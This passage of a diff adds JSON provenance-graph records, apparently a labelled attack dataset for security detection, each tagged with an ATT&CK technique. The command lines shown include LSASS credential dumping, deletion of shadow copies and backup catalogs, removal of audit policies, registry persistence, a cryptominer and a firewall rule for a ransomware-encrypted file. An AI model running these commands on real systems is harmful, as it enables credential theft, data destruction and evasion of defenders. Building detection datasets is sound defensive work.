+        "Cmdline": "\"C:\\Windows\\System32\\rundll32.exe\" C:\\windows\\System32\\comsvcs.dll MiniDump 76912 Hsdc.Dll full",
+        "Type": "Process",
+        "Pid": 3432
+    },
+    "relation": "Process Create",
+    "timestamp": 1655183989,
+    "label": "T1003.001_35d92515122effdd73801c6ac3021da7"
+}
+{
+    "srcNode": {
+        "UUID": "a38bc476-a5b7-5246-8cb9-31dd55a1b2fb",
+        "Name": "rundll32.exe",
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "Cmdline": "\"C:\\Windows\\System32\\rundll32.exe\" C:\\windows\\System32\\comsvcs.dll MiniDump 76912 Hsdc.Dll full",
+        "Type": "Process",
+        "Pid": 3432
+    },
+    "dstNode": {
+        "UUID": "1a8e944a-6b0b-5061-b1bf-31608090f2f7",
+        "Name": "Hsdc.Dll",
+        "Type": "File"
+    },
+    "relation": "WriteFile",
+    "timestamp": 1655183991,
+    "label": "T1003.001_35d92515122effdd73801c6ac3021da7"
+}
+{
+    "srcNode": {
+        "UUID": "a38bc476-a5b7-5246-8cb9-31dd55a1b2fb",
+        "Name": "rundll32.exe",
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "Cmdline": "\"C:\\Windows\\System32\\rundll32.exe\" C:\\windows\\System32\\comsvcs.dll MiniDump 76912 Hsdc.Dll full",
+        "Type": "Process",
+        "Pid": 3432
+    },
+    "dstNode": {
+        "UUID": "1a8e944a-6b0b-5061-b1bf-31608090f2f7",
+        "Name": "Hsdc.Dll",
+        "Type": "File"
+    },
+    "relation": "CloseFile",
+    "timestamp": 1655183991,
+    "label": "T1003.001_35d92515122effdd73801c6ac3021da7"
+}
+{
+    "srcNode": {
+        "UUID": "27284e64-8663-55fb-96e5-af499b01a885",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 64039,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "6ee68a69-1a9f-53e8-a003-978bfaef68fd",
+        "Name": "tasklist.exe",
+        "Image": "C:\\Windows\\system32\\tasklist.exe",
+        "Cmdline": "tasklist",
+        "Type": "Process",
+        "Pid": 4132
+    },
+    "relation": "Process Create",
+    "timestamp": 1655183992,
+    "label": "T1057_f8de05d1741dcc468f772ab0ff4dac72"
+}
+{
+    "srcNode": {
+        "UUID": "27284e64-8663-55fb-96e5-af499b01a885",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 64039,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "9e0b1914-b277-5c26-b10b-6eacad1a5157",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"@@file.payload@@\" /f",
+        "Type": "Process",
+        "Pid": 10716
+    },
+    "relation": "Process Create",
+    "timestamp": 1655183992,
+    "label": "T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac"
+}
+{
+    "srcNode": {
+        "UUID": "9e0b1914-b277-5c26-b10b-6eacad1a5157",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"@@file.payload@@\" /f",
+        "Type": "Process",
+        "Pid": 10716
+    },
+    "dstNode": {
+        "UUID": "3ab8deda-a3ba-53f3-a32e-698a0f63f7e5",
+        "Key": "HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryKey",
+    "timestamp": 1655183993,
+    "label": "T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac"
+}
+{
+    "srcNode": {
+        "UUID": "9e0b1914-b277-5c26-b10b-6eacad1a5157",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"@@file.payload@@\" /f",
+        "Type": "Process",
+        "Pid": 10716
+    },
+    "dstNode": {
+        "UUID": "3ab8deda-a3ba-53f3-a32e-698a0f63f7e5",
+        "Key": "HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command",
+        "Type": "Registry"
+    },
+    "relation": "RegCloseKey",
+    "timestamp": 1655183993,
+    "label": "T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac"
+}
+{
+    "srcNode": {
+        "UUID": "27284e64-8663-55fb-96e5-af499b01a885",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 64039,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "ebd1f0b3-7639-50d8-9b12-ffc8227da0f4",
+        "Srcaddress": "srv-73.brown-mendoza.com",
+        "Dstaddress": "169.254.1.19",
+        "Port": "21085",
+        "Type": "Network"
+    },
+    "relation": "TCP Connect",
+    "timestamp": 1655183994,
+    "label": "T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4"
+}
+{
+    "srcNode": {
+        "UUID": "27284e64-8663-55fb-96e5-af499b01a885",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 64039,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "ed5942b9-0c13-5720-97ad-297a8f50e3e9",
+        "Name": "C:\\Windows\\System32\\xmrig-6.11.2\\solo_mine_example.cmd",
+        "Type": "File"
+    },
+    "relation": "CreateFile",
+    "timestamp": 1655183994,
+    "label": "T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4"
+}
+{
+    "srcNode": {
+        "UUID": "8e229283-287b-5a83-b73a-e0be26e3f4c8",
+        "Name": "Conhost.exe",
+        "Image": "C:\\Windows\\System32\\Conhost.exe",
+        "Cmdline": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+        "Type": "Process",
+        "Pid": 6036
+    },
+    "dstNode": {
+        "UUID": "66929d72-19e8-5bfb-9884-92dc7fc9a184",
+        "Name": "C:\\Windows\\System32\\xmrig-6.11.2\\xmrig.exe",
+        "Type": "File"
+    },
+    "relation": "CloseFile",
+    "timestamp": 1655183999,
+    "label": "T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"run\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "5231a1d5-4a9d-58c7-b874-93b06778ca7f",
+        "Name": "auditpol.exe",
+        "Image": "C:\\Windows\\system32\\auditpol.exe",
+        "Cmdline": "auditpol  /remove /allusers",
+        "Type": "Process",
+        "Pid": 7988
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174702,
+    "label": "T1562.002_6a8d25d65a7d481dc479f89c62af1e6a"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"run\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "49934ac2-dbcc-5a08-bc7e-0cdca8a22121",
+        "Name": "WMIC.exe",
+        "Image": "C:\\Windows\\System32\\Wbem\\WMIC.exe",
+        "Cmdline": "wmic  process get /format:list",
+        "Type": "Process",
+        "Pid": 1832
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174702,
+    "label": "T1057_b2a1e430ca6d36eb5af2fe666e769847"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"run\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "37054a0b-62ca-5002-8b9d-8c6f7e5cda9e",
+        "Name": "netsh.exe",
+        "Image": "C:\\Windows\\system32\\netsh.exe",
+        "Cmdline": "netsh trace start capture=yes tracefile=\"jubhnxztfkmpogvntmvp.exe\" maxsize=10",
+        "Type": "Process",
+        "Pid": 6972
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174702,
+    "label": "T1040_6881a4589710d53f0c146e91db513f01"
+}
+{
+    "srcNode": {
+        "UUID": "37054a0b-62ca-5002-8b9d-8c6f7e5cda9e",
+        "Name": "netsh.exe",
+        "Image": "C:\\Windows\\system32\\netsh.exe",
+        "Cmdline": "netsh trace start capture=yes tracefile=\"jubhnxztfkmpogvntmvp.exe\" maxsize=10",
+        "Type": "Process",
+        "Pid": 6972
+    },
+    "dstNode": {
+        "UUID": "cbe7a25e-4240-5290-a737-0a63cbba5d05",
+        "Name": "jubhnxztfkmpogvntmvp.exe",
+        "Type": "File"
+    },
+    "relation": "QueryBasicInformationFile",
+    "timestamp": 1655174704,
+    "label": "T1040_6881a4589710d53f0c146e91db513f01"
+}
+{
+    "srcNode": {
+        "UUID": "37054a0b-62ca-5002-8b9d-8c6f7e5cda9e",
+        "Name": "netsh.exe",
+        "Image": "C:\\Windows\\system32\\netsh.exe",
+        "Cmdline": "netsh trace start capture=yes tracefile=\"jubhnxztfkmpogvntmvp.exe\" maxsize=10",
+        "Type": "Process",
+        "Pid": 6972
+    },
+    "dstNode": {
+        "UUID": "cbe7a25e-4240-5290-a737-0a63cbba5d05",
+        "Name": "jubhnxztfkmpogvntmvp.exe",
+        "Type": "File"
+    },
+    "relation": "WriteFile",
+    "timestamp": 1655174704,
+    "label": "T1040_6881a4589710d53f0c146e91db513f01"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"run\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "26ad65c0-989f-5184-b75a-2c295490e967",
+        "Name": "WMIC.exe",
+        "Image": "C:\\Windows\\System32\\Wbem\\WMIC.exe",
+        "Cmdline": "wmic.exe  shadowcopy delete",
+        "Type": "Process",
+        "Pid": 4632
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174709,
+    "label": "T1490_c156ac5c9fa67080365268d95f29053d"
+}
+{
+    "srcNode": {
+        "UUID": "0fa66a39-cd14-55f7-a2b0-df035ca72dff",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 46216,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "dee69328-a4c2-57ab-b1bc-072516885459",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"125a2359fedd1ea15cc3bc8978d7da01a6b7116b7be761c0b185434741b26008\"",
+        "Type": "Process",
+        "Pid": 7008
+    },
+    "relation": "Process Create",
+    "timestamp": 1655248041,
+    "label": "T1547.001_d3ef4145e4144fd694514b1c5cc17350"
+}
+{
+    "srcNode": {
+        "UUID": "dee69328-a4c2-57ab-b1bc-072516885459",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"125a2359fedd1ea15cc3bc8978d7da01a6b7116b7be761c0b185434741b26008\"",
+        "Type": "Process",
+        "Pid": 7008
+    },
+    "dstNode": {
+        "UUID": "308b88d6-b09d-5ee3-858a-26f8a8f638ae",
+        "Key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend\\1",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655248045,
+    "label": "T1547.001_d3ef4145e4144fd694514b1c5cc17350"
+}
+{
+    "srcNode": {
+        "UUID": "dee69328-a4c2-57ab-b1bc-072516885459",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"125a2359fedd1ea15cc3bc8978d7da01a6b7116b7be761c0b185434741b26008\"",
+        "Type": "Process",
+        "Pid": 7008
+    },
+    "dstNode": {
+        "UUID": "e7564858-d521-5298-a1db-d47acc659e51",
+        "Key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend",
+        "Type": "Registry"
+    },
+    "relation": "RegCloseKey",
+    "timestamp": 1655248045,
+    "label": "T1547.001_d3ef4145e4144fd694514b1c5cc17350"
+}
+{
+    "srcNode": {
+        "UUID": "0fa66a39-cd14-55f7-a2b0-df035ca72dff",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 46216,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "aa11b79d-305c-5cd7-b7a5-8ba82fff8fc7",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"$ps_url = \\\"https://download.sysinternals.com/files/Procdump.zip\\\";$download_folder = \\\"C:\\Users\\Public\\\\\\\";$staging_folder = \\\"C:\\Users\\Public\\temp\\\";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder\\\"Procdump.zip\\\" -DestinationPath $staging_folder;$arch=[System.Environment]::Is64BitOperatingSystem;if ($arch) {    iex $staging_folder\\\"\\procdump64.exe -accepteula -ma lsass.exe\\\" > $env:APPDATA\\error.dmp 2>&1;} else {    iex $staging_folder\\\"\\procdump.exe -accepteula -ma lsass.exe\\\" > $env:APPDATA\\error.dmp 2>&1;}remove-item $staging_folder -Recurse;\"",
+        "Type": "Process",
+        "Pid": 10760
+    },
+    "relation": "Process Create",
+    "timestamp": 1655248046,
+    "label": "T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554"
+}
+{
+    "srcNode": {
+        "UUID": "aa11b79d-305c-5cd7-b7a5-8ba82fff8fc7",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"$ps_url = \\\"https://download.sysinternals.com/files/Procdump.zip\\\";$download_folder = \\\"C:\\Users\\Public\\\\\\\";$staging_folder = \\\"C:\\Users\\Public\\temp\\\";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder\\\"Procdump.zip\\\" -DestinationPath $staging_folder;$arch=[System.Environment]::Is64BitOperatingSystem;if ($arch) {    iex $staging_folder\\\"\\procdump64.exe -accepteula -ma lsass.exe\\\" > $env:APPDATA\\error.dmp 2>&1;} else {    iex $staging_folder\\\"\\procdump.exe -accepteula -ma lsass.exe\\\" > $env:APPDATA\\error.dmp 2>&1;}remove-item $staging_folder -Recurse;\"",
+        "Type": "Process",
+        "Pid": 10760
+    },
+    "dstNode": {
+        "UUID": "cd311b36-c37f-52c3-a1c4-31b75e992f26",
+        "Name": "C:\\Users\\Public\\temp\\Eula.txt",
+        "Type": "File"
+    },
+    "relation": "SetDispositionInformationFile",
+    "timestamp": 1655248048,
+    "label": "T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554"
+}
+{
+    "srcNode": {
+        "UUID": "49499c64-1b11-55c0-8234-358e254af99e",
+        "Name": "procdump64.exe",
+        "Image": "C:\\Users\\Public\\temp\\procdump64.exe",
+        "Cmdline": "\"C:\\Users\\Public\\temp\\procdump64.exe\" -accepteula -ma lsass.exe",
+        "Type": "Process",
+        "Pid": 3656
+    },
+    "dstNode": {
+        "UUID": "38177c16-e46d-5c75-9e80-96301d47d44d",
+        "Name": "C:\\Windows\\System32\\lsass.exe_220414_225034.dmp",
+        "Type": "File"
+    },
+    "relation": "CloseFile",
+    "timestamp": 1655248049,
+    "label": "T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554"
+}
+{
+    "srcNode": {
+        "UUID": "0fa66a39-cd14-55f7-a2b0-df035ca72dff",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 46216,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "56d71937-2175-5e8c-b80b-909379b491cb",
+        "Name": "WMIC.exe",
+        "Image": "C:\\Windows\\System32\\Wbem\\WMIC.exe",
+        "Cmdline": "wmic  qfe get description,installedOn /format:csv",
+        "Type": "Process",
+        "Pid": 5048
+    },
+    "relation": "Process Create",
+    "timestamp": 1655248050,
+    "label": "T1047_ed736a123da6fb2aab22cfd4f437e8b5"
+}
+{
+    "srcNode": {
+        "UUID": "0fa66a39-cd14-55f7-a2b0-df035ca72dff",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 46216,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "bafacce8-07e5-5efc-a5fe-d757791ec9c0",
+        "Name": "wbadmin.exe",
+        "Image": "C:\\Windows\\system32\\wbadmin.exe",
+        "Cmdline": "wbadmin  delete catalog -quiet",
+        "Type": "Process",
+        "Pid": 4996
+    },
+    "relation": "Process Create",
+    "timestamp": 1655248050,
+    "label": "T1490_9e5e4c0655fd1b5be88bd40b8251175f"
+}
+{
+    "srcNode": {
+        "UUID": "560e5f72-d85e-5ec1-9292-4a43141c3374",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 12661,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "8de1cb81-aeaf-5473-bf0b-0462e4518d6b",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };$web = (New-Object System.Net.WebClient);$result = $web.DownloadFile(\\\"https://download.sysinternals.com/files/PSTools.zip\\\", \\\"PSTools.zip\\\");New-Item -ItemType \\\"directory\\\" C:\\Windows\\System32\\PSTools -Force;Add-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\\\"PSTools.zip\\\", \\\"C:\\Windows\\System32\\PSTools\\\");\"",
+        "Type": "Process",
+        "Pid": 4032
+    },
+    "relation": "Process Create",
+    "timestamp": 1655235079,
+    "label": "T1105_eb814e03-811a-467a-bc6d-dcd453750fa2"
+}
+{
+    "srcNode": {
+        "UUID": "8de1cb81-aeaf-5473-bf0b-0462e4518d6b",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };$web = (New-Object System.Net.WebClient);$result = $web.DownloadFile(\\\"https://download.sysinternals.com/files/PSTools.zip\\\", \\\"PSTools.zip\\\");New-Item -ItemType \\\"directory\\\" C:\\Windows\\System32\\PSTools -Force;Add-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\\\"PSTools.zip\\\", \\\"C:\\Windows\\System32\\PSTools\\\");\"",
+        "Type": "Process",
+        "Pid": 4032
+    },
+    "dstNode": {
+        "UUID": "e45efe97-602d-52b5-9daf-010cc5ce9466",
+        "Name": "C:\\Windows\\System32\\PSTools\\psping64.exe",
+        "Type": "File"
+    },
+    "relation": "SetBasicInformationFile",
+    "timestamp": 1655235082,
+    "label": "T1105_eb814e03-811a-467a-bc6d-dcd453750fa2"
+}
+{
+    "srcNode": {
+        "UUID": "8de1cb81-aeaf-5473-bf0b-0462e4518d6b",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };$web = (New-Object System.Net.WebClient);$result = $web.DownloadFile(\\\"https://download.sysinternals.com/files/PSTools.zip\\\", \\\"PSTools.zip\\\");New-Item -ItemType \\\"directory\\\" C:\\Windows\\System32\\PSTools -Force;Add-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\\\"PSTools.zip\\\", \\\"C:\\Windows\\System32\\PSTools\\\");\"",
+        "Type": "Process",
+        "Pid": 4032
+    },
+    "dstNode": {
+        "UUID": "fde097ec-4935-548a-a913-28f75ebaa803",
+        "Name": "C:\\Windows\\System32\\PSTools.zip",
+        "Type": "File"
+    },
+    "relation": "CloseFile",
+    "timestamp": 1655235082,
+    "label": "T1105_eb814e03-811a-467a-bc6d-dcd453750fa2"
+}
+{
+    "srcNode": {
+        "UUID": "560e5f72-d85e-5ec1-9292-4a43141c3374",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 12661,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "87d1ad47-e55d-54d7-8108-8e320a5b43af",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe /C reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\d0068a7c62bafd0078829a0597fa5cca1637b28f7273ffc18f79504a9714f445.sample /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\d0068a7c62bafd0078829a0597fa5cca1637b28f7273ffc18f79504a9714f445.sample /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f",
+        "Type": "Process",
+        "Pid": 8344
+    },
+    "relation": "Process Create",
+    "timestamp": 1655235085,
+    "label": "T1125_da86001b5081fcf773d8e62f22cf2b00"
+}
+{
+    "srcNode": {
+        "UUID": "66a0032f-4f14-5be5-949c-b33d985748de",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\d0068a7c62bafd0078829a0597fa5cca1637b28f7273ffc18f79504a9714f445.sample /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f ",
+        "Type": "Process",
+        "Pid": 4720
+    },
+    "dstNode": {
+        "UUID": "1e7ba3f8-4989-5182-8123-3ff07e7e7e77",
+        "Key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\d0068a7c62bafd0078829a0597fa5cca1637b28f7273ffc18f79504a9714f445.sample\\LastUsedTimeStart",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655235087,
+    "label": "T1125_da86001b5081fcf773d8e62f22cf2b00"
+}
+{
+    "srcNode": {
+        "UUID": "bbdd9b3e-f060-58a4-9494-4c9187b30a50",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\d0068a7c62bafd0078829a0597fa5cca1637b28f7273ffc18f79504a9714f445.sample /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f",
+        "Type": "Process",
+        "Pid": 8660
+    },
+    "dstNode": {
+        "UUID": "07c7d944-d05e-5bdd-95af-9ed2c9006042",
+        "Key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\d0068a7c62bafd0078829a0597fa5cca1637b28f7273ffc18f79504a9714f445.sample\\LastUsedTimeStop",
+        "Type": "Registry",
+        "Value": "96 EF 51 4B 72 04 D6 01"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655235088,
+    "label": "T1125_da86001b5081fcf773d8e62f22cf2b00"
+}
+{
+    "srcNode": {
+        "UUID": "560e5f72-d85e-5ec1-9292-4a43141c3374",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 12661,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "7c4673b7-fff4-5984-8d16-9f094f416445",
+        "Name": "d0068a7c62bafd0078829a0597fa5cca1637b28f7273ffc18f79504a9714f445.sample",
+        "Type": "File"
+    },
+    "relation": "CreateFile",
+    "timestamp": 1655235089,
+    "label": "T1562.004_41627f71f968225b9f162cb76d16bd9d"
+}
+{
+    "srcNode": {
+        "UUID": "560e5f72-d85e-5ec1-9292-4a43141c3374",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 12661,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "20a10d55-53cd-537f-9d33-f38592b40466",
+        "Name": "D:\\Company Q3 work plan-top secret.docx.quantum",
+        "Type": "File"
+    },
+    "relation": "QueryBasicInformationFile",
+    "timestamp": 1655235089,
+    "label": "T1562.004_41627f71f968225b9f162cb76d16bd9d"
+}
+{
+    "srcNode": {
+        "UUID": "560e5f72-d85e-5ec1-9292-4a43141c3374",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 12661,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "fc1cfbc0-9782-5272-8785-71fb0bf38f31",
+        "Name": "netsh.exe",
+        "Image": "C:\\Windows\\system32\\netsh.exe",
+        "Cmdline": "\"C:\\Windows\\system32\\netsh.exe\" advfirewall firewall add rule \"name=Core Networking - Router Solicitation (ICMP-In)\" dir=in action=allow program=D:\\Company Q3 work plan-top secret.docx.quantum enable=yes",
+        "Type": "Process",
